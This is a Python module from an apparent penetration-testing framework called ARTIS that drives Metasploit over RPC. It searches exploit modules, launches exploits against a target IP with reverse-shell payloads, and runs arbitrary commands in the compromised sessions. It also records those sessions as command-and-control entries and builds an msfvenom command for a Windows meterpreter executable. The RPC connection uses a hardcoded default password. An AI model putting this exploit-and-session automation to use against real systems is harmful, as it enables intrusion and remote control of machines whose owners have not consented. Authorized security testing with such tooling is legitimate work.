"""
ARTIS Metasploit Client
Programmatic interface to Metasploit Framework via RPC
"""

import time
from typing import List, Dict, Any, Optional
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError

from artis.core.logger import get_logger
from artis.core.config import get_config
from artis.core.message_bus import get_message_bus, RoutingKeys
from artis.core.database import get_database, Exploit, Session
from datetime import datetime
import uuid


class MetasploitClient:
    """
    Metasploit Framework RPC client for exploit execution and session management
    """
    
    def __init__(self):
        """Initialize Metasploit client"""
        self.logger = get_logger()
        self.config = get_config()
        self.message_bus = get_message_bus()
        self.db = get_database()
        
        # Get Metasploit RPC configuration
        self.rpc_host = self.config.get('tools.metasploit.rpc_host', 'localhost')
        self.rpc_port = self.config.get('tools.metasploit.rpc_port', 55553)
        self.rpc_ssl = self.config.get('tools.metasploit.rpc_ssl', False)
        
        self.client: Optional[MsfRpcClient] = None
        self._connect()
    
    def _connect(self):
        """Connect to Metasploit RPC server"""
        try:
            self.logger.info(f"Connecting to Metasploit RPC at {self.rpc_host}:{self.rpc_port}")
            
            # Note: In production, credentials should be configured
            # For now, using default msfrpcd credentials
            self.client = MsfRpcClient(
                password='msf',  # Default password, should be configurable
                server=self.rpc_host,
                port=self.rpc_port,
                ssl=self.rpc_ssl
            )
            
            self.logger.info("Connected to Metasploit RPC successfully")
            self.logger.audit(action='msf_connect', target=self.rpc_host, result='success')
        
        except Exception as e:
            self.logger.error(f"Failed to connect to Metasploit RPC: {str(e)}")
            self.logger.warning("Make sure msfrpcd is running: msfrpcd -P msf -S")
            self.client = None
    
    def search_exploits(self, query: str) -> List[Dict[str, Any]]:
        """
        Search for exploits by CVE, keyword, or platform
        
        Args:
            query: Search query (CVE ID, keyword, etc.)
            
        Returns:
            List of matching exploits
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return []
        
        try:
            self.logger.info(f"Searching Metasploit for: {query}")
            
            # Search modules
            results = self.client.modules.search(query)
            
            exploits = []
            for module_name in results:
                # Get module info
                try:
                    module_info = self.client.modules.use('exploit', module_name)
                    
                    exploit = {
                        'name': module_name,
                        'type': 'metasploit',
                        'description': module_info.description if hasattr(module_info, 'description') else '',
                        'rank': module_info.rank if hasattr(module_info, 'rank') else 'unknown',
                        'platform': module_info.platform if hasattr(module_info, 'platform') else [],
                        'targets': module_info.targets if hasattr(module_info, 'targets') else [],
                    }
                    exploits.append(exploit)
                
                except Exception as e:
                    self.logger.debug(f"Failed to get info for {module_name}: {str(e)}")
                    continue
            
            self.logger.info(f"Found {len(exploits)} exploits matching '{query}'")
            return exploits
        
        except Exception as e:
            self.logger.error(f"Exploit search failed: {str(e)}", exc_info=True)
            return []
    
    def execute_exploit(
        self,
        exploit_path: str,
        target_ip: str,
        target_port: int,
        payload: str = 'generic/shell_reverse_tcp',
        lhost: Optional[str] = None,
        lport: int = 4444,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Execute an exploit module
        
        Args:
            exploit_path: Metasploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
            target_ip: Target IP address
            target_port: Target port
            payload: Payload to use
            lhost: Local host for reverse connection (auto-detect if None)
            lport: Local port for reverse connection
            options: Additional exploit options
            
        Returns:
            Execution result with session info
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return {'success': False, 'error': 'Not connected to Metasploit'}
        
        try:
            self.logger.info(f"Executing exploit: {exploit_path}")
            self.logger.audit(
                action='exploit_execute',
                target=target_ip,
                result='initiated',
                exploit=exploit_path
            )
            
            # Load exploit module
            exploit = self.client.modules.use('exploit', exploit_path)
            
            # Set target options
            exploit['RHOSTS'] = target_ip
            if target_port:
                exploit['RPORT'] = target_port
            
            # Set payload
            exploit.payload = payload
            
            # Set payload options
            if lhost:
                exploit['LHOST'] = lhost
            else:
                # Try to auto-detect LHOST
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((target_ip, target_port))
                lhost = s.getsockname()[0]
                s.close()
                exploit['LHOST'] = lhost
            
            exploit['LPORT'] = lport
            
            # Set additional options
            if options:
                for key, value in options.items():
                    exploit[key] = value
            
            self.logger.info(f"Exploit configured: RHOSTS={target_ip}, LHOST={lhost}, LPORT={lport}")
            
            # Execute exploit
            self.logger.info("Launching exploit...")
            result = exploit.execute()
            
            # Wait a bit for session to establish
            time.sleep(2)
            
            # Check for sessions
            sessions = self.client.sessions.list
            
            if sessions:
                # Get the most recent session
                session_id = max(sessions.keys())
                session_info = sessions[session_id]
                
                self.logger.info(f"Exploit successful! Session {session_id} created")
                self.logger.audit(
                    action='exploit_execute',
                    target=target_ip,
                    result='success',
                    session_id=session_id
                )
                
                # Store session in database
                self._store_session(session_id, session_info, target_ip, exploit_path)
                
                # Publish to message bus
                self.message_bus.publish(RoutingKeys.SESSION_CREATED, {
                    'session_id': session_id,
                    'target_ip': target_ip,
                    'exploit': exploit_path,
                    'session_type': session_info.get('type', 'unknown')
                })
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'session_info': session_info,
                    'message': f"Session {session_id} created successfully"
                }
            else:
                self.logger.warning("Exploit executed but no session created")
                self.logger.audit(
                    action='exploit_execute',
                    target=target_ip,
                    result='failed',
                    reason='no_session'
                )
                
                return {
                    'success': False,
                    'error': 'Exploit executed but no session created',
                    'result': result
                }
        
        except Exception as e:
            self.logger.error(f"Exploit execution failed: {str(e)}", exc_info=True)
            self.logger.audit(
                action='exploit_execute',
                target=target_ip,
                result='error',
                error=str(e)
            )
            return {'success': False, 'error': str(e)}
    
    def list_sessions(self) -> Dict[int, Dict[str, Any]]:
        """
        List all active Metasploit sessions
        
        Returns:
            Dictionary of session ID to session info
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return {}
        
        try:
            sessions = self.client.sessions.list
            self.logger.info(f"Found {len(sessions)} active sessions")
            return sessions
        
        except Exception as e:
            self.logger.error(f"Failed to list sessions: {str(e)}")
            return {}
    
    def interact_session(self, session_id: int, command: str) -> str:
        """
        Execute command in a session
        
        Args:
            session_id: Session ID
            command: Command to execute
            
        Returns:
            Command output
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return ""
        
        try:
            self.logger.info(f"Executing command in session {session_id}: {command}")
            self.logger.audit(
                action='session_command',
                target=f"session_{session_id}",
                result='executed',
                command=command
            )
            
            session = self.client.sessions.session(session_id)
            output = session.write(command)
            
            # Read output
            time.sleep(1)
            result = session.read()
            
            return result
        
        except Exception as e:
            self.logger.error(f"Failed to execute command: {str(e)}")
            return f"Error: {str(e)}"
    
    def kill_session(self, session_id: int) -> bool:
        """
        Kill a session
        
        Args:
            session_id: Session ID to kill
            
        Returns:
            True if successful
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return False
        
        try:
            self.logger.info(f"Killing session {session_id}")
            session = self.client.sessions.session(session_id)
            session.stop()
            
            self.logger.audit(
                action='session_kill',
                target=f"session_{session_id}",
                result='success'
            )
            
            # Update database
            with self.db.get_session() as db_session:
                session_obj = db_session.query(Session).filter(
                    Session.session_id == str(session_id)
                ).first()
                
                if session_obj:
                    session_obj.session_status = 'dead'
                    db_session.commit()
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to kill session: {str(e)}")
            return False
    
    def _store_session(self, session_id: int, session_info: Dict[str, Any], target_ip: str, exploit_path: str):
        """
        Store session in database
        
        Args:
            session_id: Metasploit session ID
            session_info: Session information
            target_ip: Target IP
            exploit_path: Exploit used
        """
        try:
            with self.db.get_session() as db_session:
                session_obj = Session(
                    id=str(uuid.uuid4()),
                    session_id=str(session_id),
                    target_ip=target_ip,
                    target_hostname=session_info.get('target_host', ''),
                    c2_framework='meterpreter',
                    session_type=session_info.get('type', 'shell'),
                    session_status='active',
                    username=session_info.get('username', 'unknown'),
                    privileges=session_info.get('privileges', 'user'),
                    established_at=datetime.utcnow(),
                    last_seen=datetime.utcnow(),
                    metadata={
                        'exploit': exploit_path,
                        'session_info': session_info
                    }
                )
                db_session.add(session_obj)
                db_session.commit()
                
                self.logger.info(f"Session {session_id} stored in database")
        
        except Exception as e:
            self.logger.error(f"Failed to store session: {str(e)}")
    
    def generate_payload(
        self,
        payload_type: str = 'windows/meterpreter/reverse_tcp',
        lhost: str = '0.0.0.0',
        lport: int = 4444,
        format: str = 'exe',
        output_file: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Generate a standalone payload
        
        Args:
            payload_type: Payload type
            lhost: Local host
            lport: Local port
            format: Output format (exe, elf, raw, etc.)
            output_file: Output file path
            
        Returns:
            Generation result
        """
        if not self.client:
            self.logger.error("Not connected to Metasploit RPC")
            return {'success': False, 'error': 'Not connected to Metasploit'}
        
        try:
            self.logger.info(f"Generating payload: {payload_type}")
            
            # Use msfvenom via console
            # Note: pymetasploit3 doesn't have direct payload generation
            # In production, call msfvenom directly via subprocess
            
            self.logger.warning("Payload generation via RPC not fully implemented")
            self.logger.info("Use msfvenom directly: msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {format} -o {output_file}")
            
            return {
                'success': False,
                'error': 'Use msfvenom directly for payload generation',
                'command': f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {format} -o {output_file or 'payload.' + format}"
            }
        
        except Exception as e:
            self.logger.error(f"Payload generation failed: {str(e)}")
            return {'success': False, 'error': str(e)}


# Convenience functions
def search_exploits(query: str) -> List[Dict[str, Any]]:
    """Search for exploits"""
    client = MetasploitClient()
    return client.search_exploits(query)


def execute_exploit(exploit_path: str, target_ip: str, target_port: int, **kwargs) -> Dict[str, Any]:
    """Execute an exploit"""
    client = MetasploitClient()
    return client.execute_exploit(exploit_path, target_ip, target_port, **kwargs)
